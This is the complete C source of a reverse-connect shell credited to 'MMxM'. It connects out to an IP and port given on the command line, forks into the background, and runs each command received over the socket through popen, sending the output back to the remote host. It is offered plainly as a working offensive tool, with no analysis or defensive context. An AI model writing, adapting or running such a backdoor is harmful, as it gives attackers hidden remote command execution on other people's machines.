#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
 
int error(char *err){
	perror(err);
	exit(EXIT_FAILURE);
}
 
int help(char *name){
	printf("\n[+] R3v3r53 c0nn3c7 5h3ll 8y MMxM\n");
	printf("[*] How to use: %s <ip> <port>\n\n",name);
	exit(EXIT_SUCCESS);
}
 
int background(void){
	pid_t pid;
	pid = fork();
	if(pid){
		exit(0);
	}
}
 
int main(int argc,char *argv[]){
	if(argc != 3) help(argv[0]);
	int msocket,recebidos,caracter;
	char ip[16];
	strncpy(ip,argv[1],15);
	int port = atoi(argv[2]);
	char resposta[101];
	char mensagem[2];
	struct sockaddr_in addr;
	FILE *command;
	msocket = socket(AF_INET,SOCK_STREAM,0);
 
	if(msocket < 0){
		error("Fail to make socket\n");
	}
 
	addr.sin_family	= AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(ip);
 
	memset(&addr.sin_zero,0,sizeof(addr.sin_zero));
 
	if(connect(msocket,(struct sockaddr*)&addr,sizeof(addr)) == -1){
		error("Fail to connect\n");
	}
 
	background();
	printf("[+] Running in background\n");
	send(msocket,"[+] Connect\n[*] Coded by MMxM\n\n",31,0);
 
	while(recebidos = recv(msocket,resposta,100,0)){
		resposta[recebidos] = '\0';
		if(recebidos){
			command = popen(resposta,"r");
			while(caracter = fgetc(command)){
				if(caracter == EOF) break;
				sprintf(mensagem,"%c",caracter);
				send(msocket,mensagem,1,0);
			}
			pclose(command);
		}
		memset(&resposta,0,sizeof(resposta));
		memset(&mensagem,0,sizeof(mensagem));
		memset(&recebidos,0,sizeof(recebidos));
		memset(&caracter,0,sizeof(caracter));
	}
 
	close(msocket);
	exit(EXIT_SUCCESS);
}
